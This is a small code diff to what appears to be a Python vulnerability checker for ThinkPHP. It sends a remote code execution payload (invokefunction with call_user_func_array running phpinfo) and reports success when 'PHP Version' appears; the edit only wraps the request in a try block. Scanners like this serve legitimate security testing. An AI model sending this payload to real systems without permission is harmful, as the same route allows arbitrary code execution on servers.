@@ -11,8 +11,8 @@ def test(url):
     payload = r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
     url += payload
     #print url
-    r = requests.get(url)
     try:
+        r = requests.get(url)
         if 'PHP Version' in r.text:
             return True
         else:
